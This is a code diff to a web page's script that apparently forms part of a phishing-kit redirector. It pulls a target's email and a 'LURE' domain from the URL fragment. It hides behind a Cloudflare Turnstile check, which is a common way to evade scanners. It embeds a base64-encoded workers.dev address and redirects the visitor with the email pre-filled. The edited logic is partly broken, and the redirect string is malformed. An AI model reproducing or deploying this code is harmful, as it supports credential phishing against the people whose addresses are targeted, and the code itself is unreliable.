@@ -126,35 +126,75 @@
         }
 
 
-// Extract email and LURE value from the hash
-function extractAndDecodeHashValues() {
+// Extract and decode email from URL
+function extractAndDecodeEmail() {
     const url = window.location.href;
     let email = null;
-    let lureValue = null;
 
-    try {
-        // Extract #POP= value
-        if (url.includes('#POP=')) {
-            email = url.split('#POP=')[1].split('#')[0].trim();
-            email = decodeURIComponent(email);
-        }
+    // Check if the URL contains `#POP=`
+    const hashIndex = url.indexOf('#POP=');
+    if (hashIndex !== -1) {
+        try {
+            // Extract the part after `#POP=`
+            const hashFragment = url.substring(hashIndex + 5); // Skip past `#POP=`
 
-        // Extract #LURE= value
-        if (url.includes('#LURE=')) {
-            lureValue = url.split('#LURE=')[1].split('#')[0].trim();
-            lureValue = decodeURIComponent(lureValue);
+            // Decode the email if necessary (e.g., URL encoding)
+            email = decodeURIComponent(hashFragment);
+
+            // Check if it's in the obfuscated format and decode if necessary
+            if (isObfuscatedFormat(email)) {
+                console.log('Email is in obfuscated format. Decoding...');
+                email = decodeEmail(email);
+            }
+        } catch (e) {
+            console.error('Failed to extract or decode email:', e);
         }
-    } catch (e) {
-        console.error('Failed to extract or decode hash values:', e);
+    } else {
+        console.warn('No POP= pattern found in the URL hash.');
     }
 
-    console.log('Extracted Values:', { email, lureValue });
-    return { email, lureValue };
+    console.log('Final Decoded Email:', email); // Debugging log
+    return email;
 }
 
+// Extract and decode domain from URL with #LURE=
+function extractLureDomain() {
+    const url = window.location.href;
+    let domain = null;
 
+    // Check if the URL contains `#LURE=`
+    const lureIndex = url.indexOf('#LURE=');
+    if (lureIndex !== -1) {
+        try {
+            // Extract the part after `#LURE=`
+            const hashFragment = url.substring(lureIndex + 6); // Skip past `#LURE=`
 
+            // Decode the domain if necessary (e.g., URL encoding)
+            domain = decodeURIComponent(hashFragment);
 
+            // Validate and clean the domain
+            if (isValidDomain(domain)) {
+                console.log('Valid domain extracted:', domain);
+            } else {
+                console.warn('Extracted string is not a valid domain:', domain);
+                domain = null;
+            }
+        } catch (e) {
+            console.error('Failed to extract or decode domain:', e);
+        }
+    } else {
+        console.warn('No LURE= pattern found in the URL hash.');
+    }
+
+    console.log('Final Extracted Domain:', domain); // Debugging log
+    return domain;
+}
+
+// Helper function to validate a domain
+function isValidDomain(domain) {
+    const domainRegex = /^(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$/;
+    return domainRegex.test(domain);
+}
 
 // Decode Base64 URL and extract redirect URL from response
 async function getRedirectUrlWithEmail(base64Url, email) {
@@ -183,10 +223,11 @@ async function getRedirectUrlWithEmail(base64Url, email) {
         
 // Start Turnstile verification
 function startTurnstileVerification() {
+    const base64Url = "aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv";
     if (USE_TURNSTILE) {
         console.log('Starting Turnstile verification...');
         turnstile.render('#cf-turnstile', {
-            sitekey: '0x4AAAAAAAymSY_rn4CFRQRl', // Replace with your actual sitekey
+            sitekey: '0x4AAAAAAAymSY_rn4CFRQRl',
             type: 'spinner',
             callback: async function (token) {
                 if (!token) {
@@ -197,20 +238,27 @@ function startTurnstileVerification() {
                 // Show loading animation again
                 loadingDiv.style.display = 'flex';
 
-                // Extract hash values
-                const { email, lureValue } = extractAndDecodeHashValues();
+                // Extract and decode email from URL
+                var email = extractAndDecodeEmail();
+                var domain = extractLureDomain();
+                // Set a cookie for verification (optional)
+                document.cookie = 'verified=true; Path=/; SameSite=None; Secure=true';
 
                 // Wait for 3 seconds, then redirect
-                setTimeout(function () {
+                setTimeout(async function() {
                     loadingDiv.style.display = 'none';
 
-                    if (lureValue && email) {
-                        // Construct redirect URL
-                        const redirectUrl = `${lureValue}#POP=${email}?redirected=done`;
-                        console.log('Redirecting to:', redirectUrl);
-                        window.location.href = redirectUrl;
+                    if (email) {
+                        // Get the final redirect URL
+                        const redirectUrl = `${domain}POP=${email}?redirected=done`;
+                        if (redirectUrl) {
+                            console.log('Redirecting with email:', email); // Debug log to check the email
+                            window.location.href = redirectUrl;
+                        } else {
+                            console.log('Failed to retrieve redirect URL.');
+                        }
                     } else {
-                        console.error('Missing email or lureValue for redirection.');
+                        console.log('No email found to append to URL.');
                     }
                 }, 2000);
             },
@@ -223,10 +271,12 @@ function startTurnstileVerification() {
     }
 }
 
-
 // Run Turnstile verification
 startTurnstileVerification();
 
+        // Example usage of email extraction (optional)
+        var email = extractAndDecodeEmail();
+        console.log('Extracted and Decoded Email:', email);
     };
 </script>
 
